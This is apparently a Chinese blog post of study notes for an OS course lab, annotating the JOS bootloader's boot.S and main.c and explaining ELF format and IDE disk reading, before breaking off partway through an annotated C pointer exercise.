class="meta">.set</span> PROT_MODE_CSEG, <span class="number">0x8</span>         # kernel code <span class="meta">segment</span> selector</span><br><span class="line"><span class="meta">.set</span> PROT_MODE_DSEG, <span class="number">0x10</span>        # kernel data <span class="meta">segment</span> selector</span><br><span class="line"><span class="meta">.set</span> CR0_PE_ON,      <span class="number">0x1</span>         # protected mode enable flag</span><br><span class="line"></span><br><span class="line"><span class="meta">.globl</span> start</span><br><span class="line"><span class="symbol">start:</span>                        # 程序入口</span><br><span class="line"><span class="meta">  .code16</span>                     # Assemble for <span class="number">16</span>-bit mode 指导生成<span class="number">16</span>位汇编代码</span><br><span class="line">  <span class="keyword">cli</span>                         # Disable interrupts 关中断</span><br><span class="line">  <span class="keyword">cld</span>                         # String operations increment 设置串传递顺序递增</span><br><span class="line"></span><br><span class="line">  # Set <span class="meta">up</span> the important data <span class="meta">segment</span> registers (<span class="built_in">DS</span>, <span class="built_in">ES</span>, <span class="built_in">SS</span>). 设置重要的段寄存器为<span class="number">0</span></span><br><span class="line">  xorw    %ax,%ax             # <span class="meta">Segment</span> number <span class="meta">zero</span></span><br><span class="line">  movw    %ax,%ds             # -&gt; Data <span class="meta">Segment</span></span><br><span class="line">  movw    %ax,%es             # -&gt; Extra <span class="meta">Segment</span></span><br><span class="line">  movw    %ax,%ss             # -&gt; Stack <span class="meta">Segment</span></span><br><span class="line"></span><br><span class="line">  # Enable A20:</span><br><span class="line">  #   For backwards compatibility with the earliest PCs, physical</span><br><span class="line">  #   address line <span class="number">20</span> is tied low, so that addresses higher than</span><br><span class="line">  #   1MB wrap around to <span class="meta">zero</span> by <span class="meta">default</span>.  This code undoes this.</span><br><span class="line">  # 开启A20：</span><br><span class="line">  #   A20的介绍已经给出，不再赘述。</span><br><span class="line"><span class="symbol">seta20.1:</span></span><br><span class="line">  inb     <span class="number">$0</span>x64,%al               # Wait for <span class="keyword">not</span> busy 等待缓冲区可用</span><br><span class="line">  testb   <span class="number">$0</span>x2,%al                # <span class="keyword">Test</span> for bit1</span><br><span class="line">                                  # if bit1 = <span class="number">1</span> then buffer is full</span><br><span class="line">  <span class="keyword">jnz</span>     seta20<span class="meta">.1</span></span><br><span class="line"></span><br><span class="line">  movb    <span class="number">$0</span>xd1,%al               # <span class="number">0xd1</span> -&gt; port <span class="number">0x64</span></span><br><span class="line">  outb    %al,<span class="number">$0</span>x64               # Prepare to write output port 准备写入输出端口</span><br><span class="line"></span><br><span class="line"><span class="symbol">seta20.2:</span></span><br><span class="line">  inb     <span class="number">$0</span>x64,%al               # Wait for <span class="keyword">not</span> busy 等待缓冲区可用</span><br><span class="line">  testb   <span class="number">$0</span>x2,%al</span><br><span class="line">  <span class="keyword">jnz</span>     seta20<span class="meta">.2</span>                # The same as above 同上</span><br><span class="line"></span><br><span class="line">  movb    <span class="number">$0</span>xdf,%al               # <span class="number">0xdf</span> -&gt; port <span class="number">0x60</span></span><br><span class="line">  outb    %al,<span class="number">$0</span>x60               # <span class="number">0xdf</span> -&gt; A20 gate enable command 打开A20</span><br><span class="line"></span><br><span class="line">  # Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line">  # <span class="keyword">and</span> <span class="meta">segment</span> translation that makes virtual addresses</span><br><span class="line">  # identical to their physical addresses, so that the</span><br><span class="line">  # effective memory map does <span class="keyword">not</span> change during the switch.</span><br><span class="line">  <span class="keyword">lgdt</span>    gdtdesc                # Load gdt size/base to gdtr 设置全局描述符表</span><br><span class="line">  movl    %cr0, %eax             # Control register <span class="number">0</span></span><br><span class="line">                                 # bit0 is protected enable bit</span><br><span class="line">                                 # 读取控制寄存器<span class="number">0</span>的值，其Bit0为允许保护模式位</span><br><span class="line">  orl     $CR0_PE_ON, %eax       # Set PE 将允许保护模式位置<span class="number">1</span></span><br><span class="line">  movl    %eax, %cr0             # Update Control register <span class="number">0</span> 设置控制寄存器<span class="number">0</span></span><br><span class="line"></span><br><span class="line">  # Jump to next instruction, but <span class="keyword">in</span> <span class="number">32</span>-bit code <span class="meta">segment</span>.</span><br><span class="line">  # Switches processor <span class="keyword">into</span> <span class="number">32</span>-bit mode.</span><br><span class="line">  ljmp    $PROT_MODE_CSEG, $protcseg # 通过ljmp指令（跳转至下一条指令）进入保护模式</span><br><span class="line"></span><br><span class="line"><span class="meta">  .code32</span>                     # Assemble for <span class="number">32</span>-bit mode 指导生成<span class="number">32</span>位汇编代码</span><br><span class="line"><span class="symbol">protcseg:</span></span><br><span class="line">  # Set <span class="meta">up</span> the protected-mode data <span class="meta">segment</span> registers 设置保护模式的数据段寄存器</span><br><span class="line">  movw    $PROT_MODE_DSEG, %ax    # Our data <span class="meta">segment</span> selector</span><br><span class="line">  movw    %ax, %ds                # -&gt; <span class="built_in">DS</span>: Data <span class="meta">Segment</span></span><br><span class="line">  movw    %ax, %es                # -&gt; <span class="built_in">ES</span>: Extra <span class="meta">Segment</span></span><br><span class="line">  movw    %ax, %fs                # -&gt; <span class="built_in">FS</span></span><br><span class="line">  movw    %ax, %gs                # -&gt; <span class="built_in">GS</span></span><br><span class="line">  movw    %ax, %ss                # -&gt; <span class="built_in">SS</span>: Stack <span class="meta">Segment</span></span><br><span class="line"></span><br><span class="line">  # Set <span class="meta">up</span> the stack pointer <span class="keyword">and</span> <span class="keyword">call</span> <span class="keyword">into</span> C. 设置栈指针并且调用C</span><br><span class="line">  movl    $start, %esp  # Stack has the opposite extension direction than Code</span><br><span class="line">                        # 注意栈的延伸方向和代码段相反</span><br><span class="line">  <span class="keyword">call</span> bootmain #调用main.c中的bootmain函数</span><br><span class="line"></span><br><span class="line">  # If bootmain returns (it shouldn<span class="string">'t), loop.</span></span><br><span class="line"><span class="string">spin:</span></span><br><span class="line"><span class="string">  jmp spin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Bootstrap GDT 引导GDT</span></span><br><span class="line"><span class="string">.p2align 2                                # force 4 byte alignment</span></span><br><span class="line"><span class="string">gdt:</span></span><br><span class="line"><span class="string">  SEG_NULL				# null seg 默认第一个段描述符为空</span></span><br><span class="line"><span class="string">  SEG(STA_X|STA_R, 0x0, 0xffffffff)	# code seg 设置代码段描述符</span></span><br><span class="line"><span class="string">  SEG(STA_W, 0x0, 0xffffffff)	        # data seg 设置数据段描述符</span></span><br><span class="line"><span class="string">  # 关于SEG宏可以参考mmu.h</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gdtdesc:                                  # 用于设置全局段描述符寄存器</span></span><br><span class="line"><span class="string">  .word   0x17                            # sizeof(gdt) - 1 # Size of gdt</span></span><br><span class="line"><span class="string">  .long   gdt                             # address gdt # Base address of gdt</span></span><br></pre></td></tr></table></figure>
<hr>
<p>为了理解main.c，需要如下的知识储备。</p>
<h4 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h4><p>可执行和可链接格式（Executable and Linkable Format）是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件。</p>
<p>ELF文件可以分为两种组成 - 链接视图（Linking View）和执行视图（Execution View）。这里只讨论执行视图。</p>
<p>执行视图的结构如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+</span><br><span class="line">|     ELF Header     |</span><br><span class="line">+--------------------+</span><br><span class="line">|Program Header Table|</span><br><span class="line">+--------------------+</span><br><span class="line">|      Segment 1     |</span><br><span class="line">+--------------------+</span><br><span class="line">|      Segment 2     |</span><br><span class="line">+--------------------+</span><br><span class="line">|         ...        |</span><br><span class="line">+--------------------+</span><br><span class="line">|Section Header Table|</span><br><span class="line">|       optinal      |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure></p>
<p>ELF文件格式主要由ELF头（ELF Header）、程序头部表（Program Header Table）和节头部表（Section Header Table）组成。在执行视图中，节头部表是可选的。</p>
<p>有关于这些数据结构的C语言定义可以参考头文件&lt;inc/elf.h&gt;。</p>
<ul>
<li>ELF头主要包含了ELF魔数、文件类型、程序头部表偏移和大小、程序入口等信息；</li>
<li>程序头部表可以看做一个数据结构的数组，每一个元素都描述了一个段。主要包含了段的偏移、段的虚拟地址、段的物理地址、段的大小等信息。</li>
</ul>
<h4 id="磁盘控制器"><a href="#磁盘控制器" class="headerlink" title="磁盘控制器"></a>磁盘控制器</h4><p>磁盘是电脑主要的存储媒介。磁盘是由盘片构成的。每个盘片有两面或者称为表面，表面覆盖着磁性记录材料。盘片中央有一个可以旋转的主轴，它使得盘片以固定的旋转速率旋转，通常是5400-15000转每分钟（Revolution Per Minute）。磁盘通常包含一个或多个这样的盘片，并封装在一个密封的容器内。</p>
<p>每一个表面是由一组称为磁道的同心圆组成。每个磁道被划分为一组扇区。每个扇区包含相等数量的数据位（通常是512字节），这些数据编码在扇区上的磁性材料中。扇区之间由一些间隙分隔开，这些间隙中不存储数据位。间隙用来标识扇区的格式化位。</p>
<p>磁盘的柱面是所有盘片表面上到主轴中心距离相等的磁道的集合。</p>
<p>对于磁盘的寻址通常分为CHS和LBA两种。</p>
<ol>
<li>CHS即柱面（cylinder）-磁头（head）-扇区（sector）寻址。每个盘片都对应着一个磁头，每一个盘片都被划分成柱面，每一个柱面都被划分成多个段。磁盘的最小存储单元是段。早期的IBM PC架构上采用CHS进行磁盘寻址。CHS是一个三元组，包括10bit的柱面号，8bit的磁头号以及6bit的扇区号。这样CHS的最大寻址范围为2^10 × 2^8 × 2^6 × 512 = 8GB。</li>
<li>随着磁盘容量的不断扩大，CHS的8GB寻址范围已经不能满足需要，现在的磁盘普遍采用逻辑区块地址（Logical Block Adress）的方式进行寻址来进行抽象。LBA是一个整数，代表磁盘上的一个逻辑区块编号，通过将这个整数转换成CHS格式来完成磁盘的具体寻址。LBA为48个bit，最大寻址范围为128PB。在本实验中，LBA按照旧的规范采用28个bit。</li>
</ol>
<p>IDE硬盘控制器（IDE Hard Drive Controller）的0x1F7端口读为磁盘0状态寄存器。<br>其Bit6为RDY Bit，当其置1表明磁盘上电完成。在对于磁盘做任何操作（除了复位）之前务必要保证该Bit为1。<br>其Bit7为BSY Bit，当其置1表明磁盘忙。在你向磁盘发送任何指令前务必保证该Bit为0。</p>
<p>通过IDE硬盘控制器读取扇区需要如下的步骤：</p>
<ol>
<li>向0x1F2端口写入待操作的扇区数目；</li>
<li>向0x1F3-0x1F5端口依次写入LBA的低24位；</li>
<li>向0x1F6端口的低4位写入LBA的高4位，向0x1F6端口的高4位写入驱动器地址；</li>
<li>向0x1F7端口写入读命令0x20。</li>
</ol>
<p>0x1F6寄存器又称Drive/Head寄存器。其低4位是LBA的高4位。其Bit5和Bit7一般是1。其Bit6为LBA位，当置1时表示启用LBA寻址。其Bit4为DRV位。用来选择驱动器，Master驱动器为0，Slave驱动器为1。这里将高4位置为0x1110</p>
<p>在使用读命令0x20之前需要完整的设置柱面/磁头/扇区。当这个命令完成，你可以从磁盘的数据寄存器（0x1F0端口）读取256个字（16Bits）。</p>
<h4 id="main-c代码详解"><a href="#main-c代码详解" class="headerlink" title="main.c代码详解"></a>main.c代码详解</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inc/elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inc/x86.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**********************************************************************</span></span><br><span class="line"><span class="comment"> * This a dirt simple boot loader, whose sole job is to boot</span></span><br><span class="line"><span class="comment"> * an ELF kernel image from the first IDE hard disk.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * DISK LAYOUT</span></span><br><span class="line"><span class="comment"> *  * This program(boot.S and main.c) is the bootloader.  It should</span></span><br><span class="line"><span class="comment"> *    be stored in the first sector of the disk.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  * The 2nd sector onward holds the kernel image.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  * The kernel image must be in ELF format.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * BOOT UP STEPS</span></span><br><span class="line"><span class="comment"> *  * when the CPU boots it loads the BIOS into memory and executes it</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  * the BIOS intializes devices, sets of the interrupt routines, and</span></span><br><span class="line"><span class="comment"> *    reads the first sector of the boot device(e.g., hard-drive)</span></span><br><span class="line"><span class="comment"> *    into memory and jumps to it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  * Assuming this boot loader is stored in the first sector of the</span></span><br><span class="line"><span class="comment"> *    hard-drive, this code takes over...</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  * control starts in boot.S -- which sets up protected mode,</span></span><br><span class="line"><span class="comment"> *    and a stack so C code then run, then calls bootmain()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  * bootmain() in this file takes over, reads in the kernel and jumps to it.</span></span><br><span class="line"><span class="comment"> **********************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTSIZE 512</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFHDR ((struct Elf *)0x10000)    <span class="comment">// scratch space</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *, <span class="keyword">uint32_t</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readseg</span><span class="params">(<span class="keyword">uint32_t</span>, <span class="keyword">uint32_t</span>, <span class="keyword">uint32_t</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bootmain</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// read 1st page off disk 从磁盘上读取第一页</span></span><br><span class="line">    readseg((<span class="keyword">uint32_t</span>)ELFHDR, SECTSIZE * <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// is this a valid ELF? 通过ELF魔数确认ELF有效</span></span><br><span class="line">    <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// load each program segment (ignores ph flags) 读取各个段</span></span><br><span class="line">    ph = (struct Proghdr *)((<span class="keyword">uint8_t</span> *)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">    <span class="comment">// 程序头部表的起始地址</span></span><br><span class="line">    eph = ph + ELFHDR-&gt;e_phnum;    <span class="comment">// 程序头部表的结束地址</span></span><br><span class="line">    <span class="keyword">for</span> (; ph &lt; eph; ph++)</span><br><span class="line">        <span class="comment">// p_pa is the load address of this segment (as well</span></span><br><span class="line">        <span class="comment">// as the physical address)</span></span><br><span class="line">        <span class="comment">// p_pa是加载地址也是物理地址</span></span><br><span class="line">        readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call the entry point from the ELF header 从ELF头调用程序入口</span></span><br><span class="line">    <span class="comment">// note: does not return!</span></span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(ELFHDR-&gt;e_entry))();</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">    <span class="comment">// stops simulation and breaks into the debug console</span></span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) <span class="comment">/* do nothing */</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read 'count' bytes at 'offset' from kernel into physical address 'pa'.</span></span><br><span class="line"><span class="comment">// 从内核的offset处读取count个字节到物理地址pa处</span></span><br><span class="line"><span class="comment">// Might copy more than asked 可能会读取超过count个（扇区对齐）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readseg</span><span class="params">(<span class="keyword">uint32_t</span> pa, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> end_pa;</span><br><span class="line"></span><br><span class="line">    end_pa = pa + count;    <span class="comment">// 结束物理地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// round down to sector boundary 对齐到扇区</span></span><br><span class="line">    pa &amp;= ~(SECTSIZE - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// translate from bytes to sectors, and kernel starts at sector 1</span></span><br><span class="line">    offset =</span><br><span class="line">        (offset / SECTSIZE) + <span class="number">1</span>;    <span class="comment">// 算出扇区数 注意扇区从1开始（0为引导扇区）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// If this is too slow, we could read lots of sectors at a time.</span></span><br><span class="line">    <span class="comment">// We'd write more to memory than asked, but it doesn't matter --</span></span><br><span class="line">    <span class="comment">// we load in increasing order.</span></span><br><span class="line">    <span class="comment">// 在实际中往往将多个扇区一起读出以提高效率。</span></span><br><span class="line">    <span class="keyword">while</span> (pa &lt; end_pa) &#123;</span><br><span class="line">        <span class="comment">// Since we haven't enabled paging yet and we're using</span></span><br><span class="line">        <span class="comment">// an identity segment mapping (see boot.S), we can</span></span><br><span class="line">        <span class="comment">// use physical addresses directly.  This won't be the</span></span><br><span class="line">        <span class="comment">// case once JOS enables the MMU.</span></span><br><span class="line">        <span class="comment">// 考虑到没有开启分页以及boot.S中使用了一一对应的映射规则，</span></span><br><span class="line">        <span class="comment">// 加载地址和物理地址是一致的。</span></span><br><span class="line">        readsect((<span class="keyword">uint8_t</span> *)pa, offset);</span><br><span class="line">        pa += SECTSIZE;</span><br><span class="line">        offset++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitdisk</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// wait for disk reaady 等待磁盘准备完毕。</span></span><br><span class="line">    <span class="keyword">while</span> ((inb(<span class="number">0x1F7</span>) &amp; <span class="number">0xC0</span>) != <span class="number">0x40</span>) <span class="comment">/* do nothing */</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> offset)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>);    <span class="comment">// count = 1 0x1F2 Disk 0 sector count</span></span><br><span class="line">    <span class="comment">// Read one sector each time</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, offset);    <span class="comment">// Disk 0 sector number (CHS Mode)</span></span><br><span class="line">    <span class="comment">// First sector's number</span></span><br><span class="line">    outb(<span class="number">0x1F4</span>, offset &gt;&gt; <span class="number">8</span>);     <span class="comment">// Cylinder low (CHS Mode)</span></span><br><span class="line">    outb(<span class="number">0x1F5</span>, offset &gt;&gt; <span class="number">16</span>);    <span class="comment">// Cylinder high (CHS Mode)</span></span><br><span class="line">    <span class="comment">// Cylinder number</span></span><br><span class="line">    outb(<span class="number">0x1F6</span>, (offset &gt;&gt; <span class="number">24</span>) | <span class="number">0xE0</span>);    <span class="comment">// Disk 0 drive/head</span></span><br><span class="line">    <span class="comment">// MASK 11100000</span></span><br><span class="line">    <span class="comment">// Drive/Head Register: bit 7 and bit 5 should be set to 1</span></span><br><span class="line">    <span class="comment">// Bit6: 1 LBA mode, 0 CHS mode</span></span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);    <span class="comment">// cmd 0x20 - read sectors</span></span><br><span class="line">    <span class="comment">/*20H       Read sector with retry. NB: 21H = read sector</span></span><br><span class="line"><span class="comment">                without retry. For this command you have to load</span></span><br><span class="line"><span class="comment">                the complete circus of cylinder/head/sector</span></span><br><span class="line"><span class="comment">                first. When the command completes (DRQ goes</span></span><br><span class="line"><span class="comment">                active) you can read 256 words (16-bits) from the</span></span><br><span class="line"><span class="comment">                disk's data register. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read a sector</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// Data register: data exchange with 8/16 bits</span></span><br><span class="line">    <span class="comment">// insl port addr cnt: read cnt dwords from the input port</span></span><br><span class="line">    <span class="comment">// specified by port into the supplied output array addr.</span></span><br><span class="line">    <span class="comment">// dword: 4 bytes = 16 bits</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>练习3：</p>
<ol>
<li>0x7c2d: ljmp  $0x8, $0x7c32 从这句汇编指令之后处理器开始执行32位指令。ljmp指令导致了16位指令到32位指令的转变。</li>
<li>引导最后执行的指令是call *0x10018，内核的第一条指令是movw $0x1234,0x472。</li>
<li>内核的第一条指令位于0x10000c。</li>
<li>引导从程序头部表中得到段的数目以及每个段的大小，以此决定要从磁盘上读出多少个扇区。</li>
</ol>
<h4 id="加载内核"><a href="#加载内核" class="headerlink" title="加载内核"></a>加载内核</h4><p>本部分主要需要了解.text段.rodata段和.data段，并且使用objdump读取ELF格式的信息。</p>
<p>boot/Makefrag文件中指定了引导的text段的位置为0x7c00。</p>
<p>练习4：<br>阅读并学习关于C语言指针的知识。下载pointer.c，编译运行并确保理解它。</p>
<p>pointer.c的代码和解释如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>  a[<span class="number">4</span>];    <span class="comment">// 含有4个元素的整形数组</span></span><br><span class="line">    <span class="keyword">int</span> *b =</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">16</span>);    <span class="comment">// 分配16个字节的内存，并且用一个整形指针指向内存首地址</span></span><br><span class="line">    <span class="keyword">int</span> *c;    <span class="comment">// 一个悬挂的整形指针</span></span><br><span class="line">    <span class="keyword">int</span>  i;    <span class="comment">// 一个整形数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1: a = %p, b = %p, c = %p\n"</span>, a, b, c);</span><br><span class="line">    <span class="comment">// 打印a和b和c的地址，分别为0xff9bebcc, 0x566fc160和0xf7ede1e8</span></span><br><span class="line"></span><br><span class="line">    c = a;</span><br><span class="line">    <span class="comment">// 令c指向数组a的首地址</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) a[i] = <span class="number">100</span> + i;    <span class="comment">// 为a[0]到a[3]分配100-103</span></span><br><span class="line">    c[<span class="number">0</span>] = <span class="number">200</span>;                                <span class="comment">// 将c[0]也就是a[0]改为200</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"2: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>],</span><br><span class="line">           a[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// 输出200 101 102 103</span></span><br><span class="line"></span><br><span class="line">    c[<span class="number">1</span>]     = <span class="number">300</span>;    <span class="comment">// 将c[1]也就是a[1]改为300</span></span><br><span class="line">    *(c + <span class="number">2</span>) = <span class="number">301</span>;    <span class="comment">//将*(c + 2)也就是a[2]改为301</span></span><br><span class="line">    <span class="number">3</span> [c]    = <span class="number">302</span>;    <span class="comment">// 将3[c]也就是c[3]改为302</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"3: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>],</span><br><span class="line">           a[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// 输出200 300 301 302</span></span><br><span class="line"></span><br><span class="line">    c  = c + <span class="number">1</span>;    <span class="comment">// 令c指向a[1]</span></span><br><span class="line">    *c = <span class="number">400</span>;      <span class="comment">// 将a[1]改为400</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"4: a[0] = %d, a[1] = %d, a[2] = %d, 